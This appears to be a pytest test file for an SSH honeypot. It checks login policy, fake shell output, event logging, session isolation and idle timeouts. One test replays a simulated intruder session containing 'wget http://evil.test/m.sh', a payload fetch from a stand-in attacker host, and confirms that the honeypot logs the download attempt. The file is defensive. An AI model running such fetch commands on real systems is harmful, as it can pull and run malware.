import json, asyncio, pytest, asyncssh
from genno.ssh.server import start, Policy

async def _client(port, user, pw):
    return await asyncssh.connect("127.0.0.1", port, username=user, password=pw,
                                  known_hosts=None, client_keys=None, agent_path=None)

def events(p):
    return [json.loads(l) for l in open(p)]

async def _srv(tmp_path, **kw):
    log = tmp_path / "e.jsonl"
    srv = await start(port=0, logfile=str(log), keyfile=str(tmp_path / "k"), **kw)
    return srv, srv.sockets[0].getsockname()[1], log

async def test_auth_policy_and_exec(tmp_path):
    srv, port, log = await _srv(tmp_path, policy=Policy(after=2, allow=[("root", "toor")]))
    async with await _client(port, "root", "toor") as c:
        r = await c.run("foobar")
        assert "command not found" in r.stdout or "command not found" in r.stderr
        assert (await c.run("whoami")).stdout == "root\n"
    with pytest.raises(asyncssh.PermissionDenied):
        await _client(port, "admin", "admin")
    srv.close(); await srv.wait_closed()
    ev = events(log)
    auths = [e for e in ev if e["event_type"] == "auth_attempt"]
    assert any(a["success"] and a["username"] == "root" for a in auths)
    assert any(not a["success"] and a["username"] == "admin" for a in auths)
    assert [e["command"] for e in ev if e["event_type"] == "command"] == ["foobar", "whoami"]

async def test_interactive_shell_and_session_isolation(tmp_path):
    srv, port, log = await _srv(tmp_path, policy=Policy(allow=[("a", "b")]))
    async with await _client(port, "a", "b") as c:
        p = await c.create_process(term_type="xterm")
        p.stdin.write("echo pwned > /tmp/x\ncat /tmp/x\nwget http://evil.test/m.sh\nexit\n")
        out = await asyncio.wait_for(p.stdout.read(), 5)
        await p.wait()
    assert "pwned" in out and "logout" in out
    async with await _client(port, "a", "b") as c:          # new session: FS is fresh
        assert "No such file" in (await c.run("cat /tmp/x")).stdout
    srv.close(); await srv.wait_closed()
    ev = events(log)
    assert [e["command"] for e in ev if e["event_type"] == "command"][:4] == [
        "echo pwned > /tmp/x", "cat /tmp/x", "wget http://evil.test/m.sh", "exit"]
    dl = [e for e in ev if e["event_type"] == "download_attempt"]
    assert dl and dl[0]["url"] == "http://evil.test/m.sh"

async def test_idle_timeout_closes_session(tmp_path):
    srv, port, log = await _srv(tmp_path, policy=Policy(allow=[("a", "b")]), idle_timeout=0.3)
    async with await _client(port, "a", "b") as c:
        p = await c.create_process(term_type="xterm")
        await asyncio.wait_for(p.wait(), 3)
    srv.close(); await srv.wait_closed()
